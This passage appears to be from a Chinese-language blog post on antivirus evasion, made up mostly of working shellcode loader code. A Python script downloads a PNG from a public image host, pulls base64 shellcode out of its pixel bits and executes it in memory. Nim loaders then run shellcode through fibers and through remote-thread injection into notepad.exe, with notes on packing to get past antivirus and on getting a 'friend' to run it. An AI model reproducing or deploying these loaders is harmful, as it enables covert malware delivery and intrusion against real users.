    binary = <span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">8</span>-(len(bin(int))<span class="hljs-number">-2</span>))+bin(int).replace(<span class="hljs-string">&apos;0b&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)  <span class="hljs-comment"># &#x53BB;&#x6389; bin() &#x8FD4;&#x56DE;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684; &apos;0b&apos;&#xFF0C;&#x5E76;&#x5728;&#x5DE6;&#x8FB9;&#x8865;&#x8DB3; &apos;0&apos; &#x76F4;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A; 8</span>
    <span class="hljs-keyword">return</span> binary

<span class="hljs-string">&quot;&quot;&quot;
&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x7F16;&#x7801;&#x5230;&#x56FE;&#x7247;&#x4E2D;
&quot;&quot;&quot;</span>


<span class="hljs-string">&quot;&quot;&quot;
&#x4ECE;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x4E3A; UTF-8 &#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">binaryToString</span><span class="hljs-params">(binary)</span>:</span>
    index = <span class="hljs-number">0</span>
    string = []
    rec = <span class="hljs-keyword">lambda</span> x, i: x[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>] + (rec(x[<span class="hljs-number">8</span>:], i<span class="hljs-number">-1</span>) <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&apos;</span>) <span class="hljs-keyword">if</span> x <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&apos;</span>
    <span class="hljs-comment"># rec = lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &apos;&apos;)) or &apos;&apos;</span>
    fun = <span class="hljs-keyword">lambda</span> x, i: x[i+<span class="hljs-number">1</span>:<span class="hljs-number">8</span>] + rec(x[<span class="hljs-number">8</span>:], i<span class="hljs-number">-1</span>)
    <span class="hljs-keyword">while</span> index + <span class="hljs-number">1</span> &lt; len(binary):
        chartype = binary[index:].index(<span class="hljs-string">&apos;0&apos;</span>) <span class="hljs-comment"># &#x5B58;&#x653E;&#x5B57;&#x7B26;&#x6240;&#x5360;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B57;&#x7B26;&#x4F1A;&#x5B58;&#x4E3A; 0</span>
        length = chartype*<span class="hljs-number">8</span> <span class="hljs-keyword">if</span> chartype <span class="hljs-keyword">else</span> <span class="hljs-number">8</span>
        string.append(chr(int(fun(binary[index:index+length],chartype),<span class="hljs-number">2</span>)))
        index += length
    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&apos;</span>.join(string)

<span class="hljs-string">&quot;&quot;&quot;
&#x89E3;&#x7801;&#x9690;&#x85CF;&#x6570;&#x636E;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBAdecodeImage</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=r))+str(int(g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=g))+str(int(b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=b))+str(int(t&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=t)) <span class="hljs-keyword">for</span> (r,g,b,t) <span class="hljs-keyword">in</span> pixels]) <span class="hljs-comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span>
    locationDoubleNull = binary.find(<span class="hljs-string">&apos;0000000000000000&apos;</span>)
    endIndex = locationDoubleNull+(<span class="hljs-number">8</span>-(locationDoubleNull % <span class="hljs-number">8</span>)) <span class="hljs-keyword">if</span> locationDoubleNull%<span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> locationDoubleNull
    data = binaryToString(binary[<span class="hljs-number">0</span>:endIndex])
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBdecodeImage</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=r))+str(int(g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=g))+str(int(b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=b)) <span class="hljs-keyword">for</span> (r,g,b) <span class="hljs-keyword">in</span> pixels]) <span class="hljs-comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span>
    locationDoubleNull = binary.find(<span class="hljs-string">&apos;0000000000000000&apos;</span>)
    endIndex = locationDoubleNull+(<span class="hljs-number">8</span>-(locationDoubleNull % <span class="hljs-number">8</span>)) <span class="hljs-keyword">if</span> locationDoubleNull%<span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> locationDoubleNull
    data = binaryToString(binary[<span class="hljs-number">0</span>:endIndex])
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isTextFile</span><span class="hljs-params">(path)</span>:</span>
    <span class="hljs-keyword">if</span> path.endswith(<span class="hljs-string">&quot;.txt&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.m&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.h&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.c&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.py&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-string">&quot;&quot;&quot;command-line interface&quot;&quot;&quot;</span>
    <span class="hljs-comment">#arguments = docopt(__doc__)</span>
    im = Image.open(<span class="hljs-string">&apos;encodedImage.png&apos;</span>)
    print(<span class="hljs-string">&quot;&#x89E3;&#x79D8;&#x5B8C;&#x6210;&#xFF0C;&#x5BC6;&#x6587;&#x4E3A;&#xFF1A;\n&quot;</span>+RGBAdecodeImage(im)+<span class="hljs-string">&quot;\n&quot;</span>)
    func=base64.b64decode(RGBAdecodeImage(im))
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(func), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(func),len(func))
    handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ctypes.c_uint64(rwxpage), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
    ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)
</code></pre>
<p><a href="https://imgse.com/i/ppIqwX4" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppIqwX4.png" alt="ppIqwX4.png"></a></p>
<p>&#x4F7F;&#x7528;&#x7B2C;&#x4E09;&#x79CD;&#x548C;&#x7B2C;&#x4E94;&#x79CD;&#x7684;&#x7EC4;&#x5408;&#x65B9;&#x5F0F;&#xFF1A;&#x5C06;shellcode&#x9690;&#x5199;&#x5728;&#x56FE;&#x7247;&#x4E2D;&#x653E;&#x5728;&#x56FE;&#x5E8A;&#x4E0A;&#x7136;&#x540E;&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;&#x518D;&#x52A0;&#x8F7D;&#xFF0C;&#x4EE3;&#x7801;</p>
<pre><code class="lang-python">url = <span class="hljs-string">&apos;https://s1.ax1x.com/2023/04/06/ppo1GQ0.png&apos;</span>
urllib.request.urlretrieve(url, <span class="hljs-string">&apos;encodedImage.png&apos;</span>)

<span class="hljs-comment"># &#x6253;&#x5F00;&#x672C;&#x5730;&#x56FE;&#x7247;</span>
im = Image.open(<span class="hljs-string">&apos;encodedImage.png&apos;</span>)
</code></pre>
<p>&#x5168;&#x90E8;&#x4EE3;&#x7801;</p>
<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment">#coding=utf-8</span>

<span class="hljs-string">&quot;&quot;&quot;Encode png image via command-line.

Usage:
    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]
    imageEncoding (-d|decode) &lt;encodedImage&gt;

Options:
    -h,--help   &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x83DC;&#x5355;
    -e          &#x52A0;&#x5BC6;
    -d          &#x89E3;&#x5BC6;

Example:
    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png
    imageEncoding -d encodedImage.png
&quot;&quot;&quot;</span>

<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">from</span> docopt <span class="hljs-keyword">import</span> docopt
<span class="hljs-keyword">import</span> base64,ctypes
<span class="hljs-keyword">import</span> urllib.request



<span class="hljs-string">&quot;&quot;&quot;
&#x5185;&#x7F6E;&#x51FD;&#x6570; bin() &#x7684;&#x66FF;&#x4EE3;&#xFF0C;&#x8FD4;&#x56DE;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">constLenBin</span><span class="hljs-params">(int)</span>:</span>
    binary = <span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">8</span>-(len(bin(int))<span class="hljs-number">-2</span>))+bin(int).replace(<span class="hljs-string">&apos;0b&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)  <span class="hljs-comment"># &#x53BB;&#x6389; bin() &#x8FD4;&#x56DE;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684; &apos;0b&apos;&#xFF0C;&#x5E76;&#x5728;&#x5DE6;&#x8FB9;&#x8865;&#x8DB3; &apos;0&apos; &#x76F4;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A; 8</span>
    <span class="hljs-keyword">return</span> binary

<span class="hljs-string">&quot;&quot;&quot;
&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x7F16;&#x7801;&#x5230;&#x56FE;&#x7247;&#x4E2D;
&quot;&quot;&quot;</span>


<span class="hljs-string">&quot;&quot;&quot;
&#x4ECE;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x4E3A; UTF-8 &#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">binaryToString</span><span class="hljs-params">(binary)</span>:</span>
    index = <span class="hljs-number">0</span>
    string = []
    rec = <span class="hljs-keyword">lambda</span> x, i: x[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>] + (rec(x[<span class="hljs-number">8</span>:], i<span class="hljs-number">-1</span>) <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&apos;</span>) <span class="hljs-keyword">if</span> x <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&apos;</span>
    <span class="hljs-comment"># rec = lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &apos;&apos;)) or &apos;&apos;</span>
    fun = <span class="hljs-keyword">lambda</span> x, i: x[i+<span class="hljs-number">1</span>:<span class="hljs-number">8</span>] + rec(x[<span class="hljs-number">8</span>:], i<span class="hljs-number">-1</span>)
    <span class="hljs-keyword">while</span> index + <span class="hljs-number">1</span> &lt; len(binary):
        chartype = binary[index:].index(<span class="hljs-string">&apos;0&apos;</span>) <span class="hljs-comment"># &#x5B58;&#x653E;&#x5B57;&#x7B26;&#x6240;&#x5360;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B57;&#x7B26;&#x4F1A;&#x5B58;&#x4E3A; 0</span>
        length = chartype*<span class="hljs-number">8</span> <span class="hljs-keyword">if</span> chartype <span class="hljs-keyword">else</span> <span class="hljs-number">8</span>
        string.append(chr(int(fun(binary[index:index+length],chartype),<span class="hljs-number">2</span>)))
        index += length
    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&apos;</span>.join(string)

<span class="hljs-string">&quot;&quot;&quot;
&#x89E3;&#x7801;&#x9690;&#x85CF;&#x6570;&#x636E;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBAdecodeImage</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=r))+str(int(g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=g))+str(int(b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=b))+str(int(t&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=t)) <span class="hljs-keyword">for</span> (r,g,b,t) <span class="hljs-keyword">in</span> pixels]) <span class="hljs-comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span>
    locationDoubleNull = binary.find(<span class="hljs-string">&apos;0000000000000000&apos;</span>)
    endIndex = locationDoubleNull+(<span class="hljs-number">8</span>-(locationDoubleNull % <span class="hljs-number">8</span>)) <span class="hljs-keyword">if</span> locationDoubleNull%<span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> locationDoubleNull
    data = binaryToString(binary[<span class="hljs-number">0</span>:endIndex])
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBdecodeImage</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=r))+str(int(g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=g))+str(int(b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=b)) <span class="hljs-keyword">for</span> (r,g,b) <span class="hljs-keyword">in</span> pixels]) <span class="hljs-comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span>
    locationDoubleNull = binary.find(<span class="hljs-string">&apos;0000000000000000&apos;</span>)
    endIndex = locationDoubleNull+(<span class="hljs-number">8</span>-(locationDoubleNull % <span class="hljs-number">8</span>)) <span class="hljs-keyword">if</span> locationDoubleNull%<span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> locationDoubleNull
    data = binaryToString(binary[<span class="hljs-number">0</span>:endIndex])
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isTextFile</span><span class="hljs-params">(path)</span>:</span>
    <span class="hljs-keyword">if</span> path.endswith(<span class="hljs-string">&quot;.txt&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.m&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.h&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.c&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.py&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-string">&quot;&quot;&quot;command-line interface&quot;&quot;&quot;</span>
    <span class="hljs-comment">#arguments = docopt(__doc__)</span>
    <span class="hljs-comment"># im = Image.open(&apos;encodedImage.png&apos;)  https://s1.ax1x.com/2023/04/06/ppo1GQ0.png</span>
    <span class="hljs-comment">#    im = Image.open(&apos;https://s1.ax1x.com/2023/04/06/ppo1GQ0.png&apos;)</span>
    <span class="hljs-comment"># print(&quot;&#x89E3;&#x79D8;&#x5B8C;&#x6210;&#xFF0C;&#x5BC6;&#x6587;&#x4E3A;&#xFF1A;\n&quot;+RGBAdecodeImage(im)+&quot;\n&quot;)</span>
    <span class="hljs-comment"># all=requests.get(&apos;http://192.168.43.86/all.txt&apos;).text</span>
    url = <span class="hljs-string">&apos;https://s1.ax1x.com/2023/04/06/ppo1GQ0.png&apos;</span>
    urllib.request.urlretrieve(url, <span class="hljs-string">&apos;encodedImage.png&apos;</span>)
    im = Image.open(<span class="hljs-string">&apos;encodedImage.png&apos;</span>)


    func=base64.b64decode(RGBAdecodeImage(im))
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(func), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(func),len(func))
    handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ctypes.c_uint64(rwxpage), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
    ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)
</code></pre>
<p>&#x8BA9;&#x597D;&#x670B;&#x53CB;&#x8BD5;&#x8BD5;</p>
<p><a href="https://imgse.com/i/pposNgf" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/pposNgf.png" alt="pposNgf.png"></a></p>
<p><a href="https://imgse.com/i/pposdKS" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/pposdKS.png" alt="pposdKS.png"></a></p>
<pre><code>&#x5206;&#x79BB;&#x514D;&#x6740; + uuid/mac/ipv4 + &#x52A0;&#x58F3;
</code></pre><h3 id="&#x5185;&#x5B58;&#x52A0;&#x8F7D;">&#x5185;&#x5B58;&#x52A0;&#x8F7D;</h3>
<pre><code>uuid mac ipv4
</code></pre><h3 id="nim&#x514D;&#x6740;">Nim&#x514D;&#x6740;</h3>
<p><a href="https://github.com/byt3bl33d3r/OffensiveNim" target="_blank">https://github.com/byt3bl33d3r/OffensiveNim</a></p>
<pre><code>//&#x5C06;&#x76EE;&#x6807;&#x6587;&#x4EF6;&#x7F16;&#x8BD1;&#x6210;c&#x8BED;&#x8A00;
nim c test.nim
//
nim cpp test.nim

//&#x7F16;&#x8BD1;64&#x4F4D;
nim c -d:mingw --app:gui --cpu:amd64 -d:danger -d:strip --opt:size --passc=flto --passl=flto test.nim
//&#x7F16;&#x8BD1;32&#x4F4D;
nim c -d:mingw --app:gui
</code></pre><p>&#x6BD4;&#x5982;</p>
<pre><code class="lang-nim"><span class="hljs-comment">#[</span>
    <span class="hljs-type">Author</span>: <span class="hljs-type">HopScotch</span>, <span class="hljs-type">Twitter</span>: @<span class="hljs-number">0</span>xHop
    <span class="hljs-type">License</span>: <span class="hljs-type">BSD</span> <span class="hljs-number">3</span>-<span class="hljs-type">Clause</span>
]<span class="hljs-comment">#</span>

<span class="hljs-keyword">import</span> winim/lean
<span class="hljs-keyword">import</span> osproc


<span class="hljs-keyword">proc</span> <span class="hljs-type">RunFiber</span>[I, T](shellcode: <span class="hljs-built_in">array</span>[I, T]): <span class="hljs-built_in">void</span> =
    <span class="hljs-keyword">let</span> <span class="hljs-type">MasterFiber</span> = <span class="hljs-type">ConvertThreadToFiber</span>(<span class="hljs-type">NULL</span>)
    <span class="hljs-keyword">let</span> vAlloc = <span class="hljs-type">VirtualAlloc</span>(<span class="hljs-type">NULL</span>, <span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len), <span class="hljs-type">MEM_COMMIT</span>, <span class="hljs-type">PAGE_EXECUTE_READ_WRITE</span>)
    <span class="hljs-keyword">var</span> bytesWritten: <span class="hljs-type">SIZE_T</span>
    <span class="hljs-keyword">let</span> pHandle = <span class="hljs-type">GetCurrentProcess</span>()
    <span class="hljs-type">WriteProcessMemory</span>( pHandle, vAlloc, unsafeaddr shellcode, <span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len), <span class="hljs-keyword">addr</span> bytesWritten)
    <span class="hljs-keyword">let</span> xFiber = <span class="hljs-type">CreateFiber</span>(<span class="hljs-number">0</span>, <span class="hljs-keyword">cast</span>[<span class="hljs-type">LPFIBER_START_ROUTINE</span>](vAlloc), <span class="hljs-type">NULL</span>)
    <span class="hljs-type">SwitchToFiber</span>(xFiber)



<span class="hljs-keyword">when</span> defined(windows):

    <span class="hljs-comment"># https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler</span>
    <span class="hljs-keyword">when</span> defined(i386):
        <span class="hljs-comment"># ./msfvenom -p windows/messagebox -f csharp, then modified for Nim arrays</span>
        echo <span class="hljs-string">&quot;[*] Running in x86 process&quot;</span>
        <span class="hljs-keyword">var</span> shellcode: <span class="hljs-built_in">array</span>[<span class="hljs-number">272</span>, byte] = [
        byte <span class="hljs-number">0xd9</span>,<span class="hljs-number">0xeb</span>]

    <span class="hljs-keyword">elif</span> defined(amd64):
        echo <span class="hljs-string">&quot;[*] Running in x64 process&quot;</span>
        <span class="hljs-keyword">var</span> shellcode: <span class="hljs-built_in">array</span>[<span class="hljs-number">892</span>, byte] = [
        byte <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>]

    <span class="hljs-comment"># This is essentially the equivalent of &apos;if __name__ == &apos;__main__&apos; in python</span>
    <span class="hljs-keyword">when</span> isMainModule:
        <span class="hljs-type">RunFiber</span>(shellcode)
</code></pre>
<p>&#x8FD9;&#x91CC;&#x5207;&#x8BB0;&#x6587;&#x4EF6;&#x540D;&#x4E0D;&#x80FD;&#x592A;&#x7B80;&#x5355;&#xFF0C;&#x4E14;&#x4E00;&#x5B9A;&#x8981;&#x770B;&#x5230;&#x751F;&#x6210;&#x7684;shellcode&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5982;&#x56FE;</p>
<p><a href="https://imgse.com/i/ppoeh7R" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppoeh7R.png" alt="ppoeh7R.png"></a></p>
<p><a href="https://imgse.com/i/ppoe5A1" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppoe5A1.png" alt="ppoe5A1.png"></a></p>
<p>&#x6210;&#x529F;&#x4E0A;&#x7EBF;</p>
<p><a href="https://imgse.com/i/ppoeH1O" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppoeH1O.png" alt="ppoeH1O.png"></a></p>
<p>&#x52A0;&#x4E2A;&#x58F3;&#x76F4;&#x63A5;&#x7ED5;&#x8FC7;&#x706B;&#x7ED2;&#x7B49;</p>
<p>&#x6362;&#x4E00;&#x79CD;&#x4E0A;&#x7EBF;&#x65B9;&#x5F0F;</p>
<pre><code class="lang-nim"><span class="hljs-keyword">import</span> winim/lean
<span class="hljs-keyword">import</span> osproc
<span class="hljs-keyword">import</span> httpclient
<span class="hljs-keyword">import</span> winim/com
<span class="hljs-keyword">import</span> base64

<span class="hljs-keyword">proc</span> injectCreateRemoteThread[I, T](shellcode: <span class="hljs-built_in">array</span>[I, T]): <span class="hljs-built_in">void</span> =

    <span class="hljs-comment"># Under the hood, the startProcess function from Nim&apos;s osproc module is calling CreateProcess() :D</span>
    <span class="hljs-keyword">let</span> tProcess = startProcess(<span class="hljs-string">&quot;notepad.exe&quot;</span>)
    tProcess.suspend() <span class="hljs-comment"># That&apos;s handy!</span>
    defer: tProcess.close()

    echo <span class="hljs-string">&quot;[*] Target Process: &quot;</span>, tProcess.processID

    <span class="hljs-keyword">let</span> pHandle = <span class="hljs-type">OpenProcess</span>(
        <span class="hljs-type">PROCESS_ALL_ACCESS</span>, 
        <span class="hljs-literal">false</span>, 
        <span class="hljs-keyword">cast</span>[<span class="hljs-type">DWORD</span>](tProcess.processID)
    )
    defer: <span class="hljs-type">CloseHandle</span>(pHandle)

    echo <span class="hljs-string">&quot;[*] pHandle: &quot;</span>, pHandle

    <span class="hljs-keyword">let</span> rPtr = <span class="hljs-type">VirtualAllocEx</span>(
        pHandle,
        <span class="hljs-type">NULL</span>,
        <span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len),
        <span class="hljs-type">MEM_COMMIT</span>,
        <span class="hljs-type">PAGE_EXECUTE_READ_WRITE</span>
    )

    <span class="hljs-keyword">var</span> bytesWritten: <span class="hljs-type">SIZE_T</span>
    <span class="hljs-keyword">let</span> wSuccess = <span class="hljs-type">WriteProcessMemory</span>(
        pHandle, 
        rPtr,
        unsafeAddr shellcode,
        <span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len),
        <span class="hljs-keyword">addr</span> bytesWritten
    )

    echo <span class="hljs-string">&quot;[*] WriteProcessMemory: &quot;</span>, <span class="hljs-built_in">bool</span>(wSuccess)
    echo <span class="hljs-string">&quot;    \\-- bytes written: &quot;</span>, bytesWritten
    echo <span class="hljs-string">&quot;&quot;</span>

    <span class="hljs-keyword">let</span> tHandle = <span class="hljs-type">CreateRemoteThread</span>(
        pHandle, 
        <span class="hljs-type">NULL</span>,
        <span class="hljs-number">0</span>,
        <span class="hljs-keyword">cast</span>[<span class="hljs-type">LPTHREAD_START_ROUTINE</span>](rPtr),
        <span class="hljs-type">NULL</span>, 
        <span class="hljs-number">0</span>, 
        <span class="hljs-type">NULL</span>
    )
    defer: <span class="hljs-type">CloseHandle</span>(tHandle)

    echo <span class="hljs-string">&quot;[*] tHandle: &quot;</span>, tHandle
    echo <span class="hljs-string">&quot;[+] Injected&quot;</span>

<span class="hljs-keyword">when</span> defined(windows):
    <span class="hljs-comment"># https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler</span>
    <span class="hljs-keyword">when</span> defined(amd64):
        <span class="hljs-keyword">var</span> shellcode: <span class="hljs-built_in">array</span>[<span class="hljs-number">892</span>, byte] = [byte <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x48</span>]                                                                                  
        echo shellcode                                                              


    <span class="hljs-comment"># This is essentially the equivalent of &apos;if __name__ == &apos;__main__&apos; in python</span>
